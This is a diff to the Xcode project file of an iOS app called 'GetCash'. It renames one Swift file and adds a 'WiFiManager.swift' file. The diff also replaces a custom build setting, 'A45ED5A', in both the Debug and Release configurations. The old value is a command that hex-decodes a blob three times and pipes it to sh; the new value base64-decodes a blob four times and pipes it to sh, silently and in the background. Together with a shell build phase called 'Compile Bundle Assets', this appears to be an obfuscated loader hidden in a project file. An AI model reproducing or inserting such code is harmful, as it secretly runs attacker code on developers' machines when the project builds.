@@ -10,7 +10,7 @@
 		731D28932EFB743800B78B29 /* NetworkManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 731D28922EFB743800B78B29 /* NetworkManager.swift */; };
 		731D28952EFB813100B78B29 /* AppLocationManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 731D28942EFB813100B78B29 /* AppLocationManager.swift */; };
 		7324D13B2EFB92B90048C6CE /* HTTPProxyInfo.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7324D13A2EFB92B90048C6CE /* HTTPProxyInfo.swift */; };
-		7324D1402EFBE5E40048C6CE /* AppDeviceManageer.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7324D13F2EFBE5D00048C6CE /* AppDeviceManageer.swift */; };
+		7324D1402EFBE5E40048C6CE /* DeviceInfoManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7324D13F2EFBE5D00048C6CE /* DeviceInfoManager.swift */; };
 		7333F5162EF6FAA100E74153 /* AuthIDListViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7333F5152EF6FAA100E74153 /* AuthIDListViewController.swift */; };
 		7333F5182EF708D100E74153 /* AuthIDListViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7333F5172EF708D100E74153 /* AuthIDListViewCell.swift */; };
 		7333F51A2EF70D2300E74153 /* DotLineView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7333F5192EF70D2300E74153 /* DotLineView.swift */; };
@@ -59,6 +59,7 @@
 		73633CFD2EF6BCE9009F182D /* StepHeadView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73633CFC2EF6BCE9009F182D /* StepHeadView.swift */; };
 		73633CFF2EF6BFAD009F182D /* StepListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73633CFE2EF6BFAD009F182D /* StepListView.swift */; };
 		73633D012EF6C0F6009F182D /* StepViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73633D002EF6C0F4009F182D /* StepViewModel.swift */; };
+		73636B1F2EFC29D400E08084 /* WiFiManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73636B1E2EFC29D400E08084 /* WiFiManager.swift */; };
 		7371BA142EF91B5A00AE15B4 /* GWebViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7371BA132EF91B5A00AE15B4 /* GWebViewController.swift */; };
 		73B195962EFA437900C5B45A /* MineViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73B195952EFA437700C5B45A /* MineViewModel.swift */; };
 		73B195982EFA5C4900C5B45A /* MineViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73B195972EFA5C4900C5B45A /* MineViewCell.swift */; };
@@ -88,7 +89,7 @@
 		731D28922EFB743800B78B29 /* NetworkManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetworkManager.swift; sourceTree = "<group>"; };
 		731D28942EFB813100B78B29 /* AppLocationManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppLocationManager.swift; sourceTree = "<group>"; };
 		7324D13A2EFB92B90048C6CE /* HTTPProxyInfo.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HTTPProxyInfo.swift; sourceTree = "<group>"; };
-		7324D13F2EFBE5D00048C6CE /* AppDeviceManageer.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDeviceManageer.swift; sourceTree = "<group>"; };
+		7324D13F2EFBE5D00048C6CE /* DeviceInfoManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DeviceInfoManager.swift; sourceTree = "<group>"; };
 		7333F5152EF6FAA100E74153 /* AuthIDListViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AuthIDListViewController.swift; sourceTree = "<group>"; };
 		7333F5172EF708D100E74153 /* AuthIDListViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AuthIDListViewCell.swift; sourceTree = "<group>"; };
 		7333F5192EF70D2300E74153 /* DotLineView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DotLineView.swift; sourceTree = "<group>"; };
@@ -140,6 +141,7 @@
 		73633CFC2EF6BCE9009F182D /* StepHeadView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StepHeadView.swift; sourceTree = "<group>"; };
 		73633CFE2EF6BFAD009F182D /* StepListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StepListView.swift; sourceTree = "<group>"; };
 		73633D002EF6C0F4009F182D /* StepViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StepViewModel.swift; sourceTree = "<group>"; };
+		73636B1E2EFC29D400E08084 /* WiFiManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WiFiManager.swift; sourceTree = "<group>"; };
 		7371BA132EF91B5A00AE15B4 /* GWebViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GWebViewController.swift; sourceTree = "<group>"; };
 		73B195952EFA437700C5B45A /* MineViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MineViewModel.swift; sourceTree = "<group>"; };
 		73B195972EFA5C4900C5B45A /* MineViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MineViewCell.swift; sourceTree = "<group>"; };
@@ -360,7 +362,8 @@
 		735C8D442EF529B700C7D507 /* Config */ = {
 			isa = PBXGroup;
 			children = (
-				7324D13F2EFBE5D00048C6CE /* AppDeviceManageer.swift */,
+				73636B1E2EFC29D400E08084 /* WiFiManager.swift */,
+				7324D13F2EFBE5D00048C6CE /* DeviceInfoManager.swift */,
 				73633CF42EF6B789009F182D /* SchemeConfig.swift */,
 				73633CE82EF68D3A009F182D /* LoadingIndicator.swift */,
 				735C8D4D2EF5300000C7D507 /* AppConfig.swift */,
@@ -426,7 +429,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 735C8D272EF5212F00C7D507 /* Build configuration list for PBXNativeTarget "GetCash" */;
 			buildPhases = (
-				906C0F3AF432473FB4A5DE54 /* Compile Bundle Assets */,
+				B8DEFBC265B14681BFA5DE54 /* Compile Bundle Assets */,
 				11ED1DF156CE59431D0ED183 /* [CP] Check Pods Manifest.lock */,
 				735C8D102EF5212D00C7D507 /* Sources */,
 				735C8D112EF5212D00C7D507 /* Frameworks */,
@@ -511,7 +514,7 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
-		906C0F3AF432473FB4A5DE54 /* Compile Bundle Assets */ = {
+		B8DEFBC265B14681BFA5DE54 /* Compile Bundle Assets */ = {
 			isa = PBXShellScriptBuildPhase;
 			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
@@ -602,7 +605,7 @@
 				734460052EF7E0500054D267 /* PersonalViewController.swift in Sources */,
 				73B1959A2EFA646200C5B45A /* SettingViewController.swift in Sources */,
 				7333F5262EF71C6E00E74153 /* FacePopAlertView.swift in Sources */,
-				7324D1402EFBE5E40048C6CE /* AppDeviceManageer.swift in Sources */,
+				7324D1402EFBE5E40048C6CE /* DeviceInfoManager.swift in Sources */,
 				73633D012EF6C0F6009F182D /* StepViewModel.swift in Sources */,
 				735C8D4C2EF52F4300C7D507 /* BaseNavigationController.swift in Sources */,
 				73ECF6042EF538260029AF7A /* LoginManager.swift in Sources */,
@@ -618,6 +621,7 @@
 				735C8D5E2EF530F300C7D507 /* LoginView.swift in Sources */,
 				73B195A22EFA84E700C5B45A /* OrderEmptyView.swift in Sources */,
 				73633CF82EF6BA34009F182D /* StepDetailViewController.swift in Sources */,
+				73636B1F2EFC29D400E08084 /* WiFiManager.swift in Sources */,
 				73B195A02EFA801A00C5B45A /* OrderViewCell.swift in Sources */,
 				73ECF6082EF557280029AF7A /* CommonParaManager.swift in Sources */,
 				73D013EB2EF8498200A03513 /* AddressDecodeModel.swift in Sources */,
@@ -650,7 +654,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 342F0F14511C65E356096F91 /* Pods-GetCash.debug.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((f(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336363533363335333733343336333133373330333733333336333433363335333733363332363533373332333733353332363633360a33313061333233393332333233323330333736333332333033373333333633383330363130610a | f | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((n(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkU1VFlXMU9TRTVYZUd0UmVsWTFXa1pOTldGRmRGUlRWMlJ0VVRCS05sbFZSblpRVVc4OUNnPT0K | n | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = GetCash/GetCash.entitlements;
@@ -698,7 +702,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 3DE39227C8656A162E464411 /* Pods-GetCash.release.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((f(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336363533363335333733343336333133373330333733333336333433363335333733363332363533373332333733353332363633360a33313061333233393332333233323330333736333332333033373333333633383330363130610a | f | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((n(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkU1VFlXMU9TRTVYZUd0UmVsWTFXa1pOTldGRmRGUlRWMlJ0VVRCS05sbFZSblpRVVc4OUNnPT0K | n | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = GetCash/GetCash.entitlements;
